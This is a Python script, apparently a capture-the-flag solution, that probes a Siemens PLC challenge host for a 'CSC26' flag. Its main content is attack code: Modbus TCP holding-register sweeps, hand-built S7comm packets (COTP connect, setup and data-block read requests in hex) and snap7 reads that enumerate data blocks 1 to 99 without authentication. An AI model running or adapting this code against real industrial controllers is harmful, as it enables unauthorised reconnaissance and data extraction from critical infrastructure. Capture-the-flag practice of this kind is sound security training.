#!/usr/bin/env python3
"""
Siemens PLC Data Reader - Alternative approach
Uses multiple methods to extract data from the PLC
"""

import socket
import sys
import time

HOST = "mnbvcxzqwertyui-csc26.cybersecuritychallenge.al"
PORT = 10023

def try_modbus_tcp():
    """
    Try Modbus TCP protocol (common in industrial systems)
    """
    print("\n[*] Trying Modbus TCP protocol...")
    
    try:
        from pymodbus.client import ModbusTcpClient
        
        client = ModbusTcpClient(HOST, port=PORT)
        
        if client.connect():
            print("[+] Modbus connection successful!")
            
            # Try reading holding registers
            for start_addr in range(0, 1000, 100):
                print(f"[*] Reading registers {start_addr} to {start_addr + 100}")
                result = client.read_holding_registers(start_addr, 100, slave=1)
                
                if not result.isError():
                    # Convert registers to bytes
                    data = b''
                    for reg in result.registers:
                        data += reg.to_bytes(2, byteorder='big')
                    
                    # Try to decode
                    decoded = data.decode('ascii', errors='ignore')
                    print(f"[*] Decoded: {decoded[:100]}")
                    
                    if 'CSC26' in decoded:
                        print(f"\n[!] FLAG FOUND: {decoded}")
                        client.close()
                        return decoded
            
            client.close()
        else:
            print("[-] Modbus connection failed")
            
    except ImportError:
        print("[-] pymodbus not installed")
    except Exception as e:
        print(f"[-] Modbus error: {e}")
    
    return None

def try_raw_connection():
    """
    Try raw socket connection with various approaches
    """
    print("\n[*] Trying raw socket connection...")
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((HOST, PORT))
        print("[+] Connected!")
        
        # Set socket to non-blocking to check for immediate data
        sock.setblocking(False)
        time.sleep(0.5)
        
        try:
            data = sock.recv(4096)
            if data:
                print(f"[+] Received immediate data: {data}")
                decoded = data.decode('ascii', errors='ignore')
                print(f"[*] Decoded: {decoded}")
                
                if 'CSC26' in decoded:
                    print(f"\n[!] FLAG FOUND: {decoded}")
                    sock.close()
                    return decoded
        except BlockingIOError:
            print("[*] No immediate data available")
        
        # Set back to blocking
        sock.setblocking(True)
        sock.settimeout(5)
        
        # Try various S7 protocol messages
        print("\n[*] Trying S7 protocol messages...")
        
        # COTP Connection Request
        cotp_cr = bytes.fromhex('0300001611e00000001400c0010ac1020100c2020102')
        sock.send(cotp_cr)
        
        try:
            response = sock.recv(4096)
            print(f"[+] COTP Response: {response.hex()}")
            
            # S7 Setup Communication
            s7_setup = bytes.fromhex('0300001902f08032010000000000080000f0000001000101e0')
            sock.send(s7_setup)
            
            response = sock.recv(4096)
            print(f"[+] S7 Setup Response: {response.hex()}")
            
            # Try reading different data blocks
            for db_num in range(1, 10):
                print(f"\n[*] Reading DB{db_num}...")
                # S7 Read DB request
                s7_read = bytes.fromhex(f'0300001f02f080320700000000000e00000401120a100200{db_num:02x}0000008400000000')
                sock.send(s7_read)
                
                response = sock.recv(4096)
                if response:
                    decoded = response.decode('ascii', errors='ignore')
                    print(f"[*] DB{db_num} Response: {decoded[:100]}")
                    
                    if 'CSC26' in decoded:
                        print(f"\n[!] FLAG FOUND: {decoded}")
                        sock.close()
                        return decoded
                        
        except socket.timeout:
            print("[-] Socket timeout during S7 communication")
        
        sock.close()
        
    except Exception as e:
        print(f"[-] Error: {e}")
        import traceback
        traceback.print_exc()
    
    return None

def try_snap7():
    """
    Try using snap7 library for Siemens S7 communication
    """
    print("\n[*] Trying snap7 library...")
    
    try:
        import snap7
        from snap7.util import get_string
        
        client = snap7.client.Client()
        client.connect(HOST, 0, 1, PORT)
        
        if client.get_connected():
            print("[+] snap7 connection successful!")
            
            # Try reading different areas
            # DB (Data Block), M (Merkers), I (Inputs), O (Outputs)
            
            for db_num in range(1, 100):
                try:
                    print(f"[*] Reading DB{db_num}...")
                    data = client.db_read(db_num, 0, 1024)
                    
                    decoded = data.decode('ascii', errors='ignore')
                    if 'CSC26' in decoded:
                        print(f"\n[!] FLAG FOUND in DB{db_num}: {decoded}")
                        client.disconnect()
                        return decoded
                        
                except Exception as e:
                    continue
            
            client.disconnect()
        else:
            print("[-] snap7 connection failed")
            
    except ImportError:
        print("[-] snap7 not installed")
    except Exception as e:
        print(f"[-] snap7 error: {e}")
    
    return None

if __name__ == "__main__":
    print("=" * 70)
    print("Siemens PLC Data Reader - Alternative Approach")
    print("=" * 70)
    
    # Try different methods
    flag = try_raw_connection()
    
    if not flag:
        flag = try_modbus_tcp()
    
    if not flag:
        flag = try_snap7()
    
    if flag:
        print("\n" + "=" * 70)
        print(f"SUCCESS! Flag: {flag}")
        print("=" * 70)
    else:
        print("\n[-] Flag not found with automated methods.")
        print("[*] Consider manual analysis with Wireshark or specialized tools.")
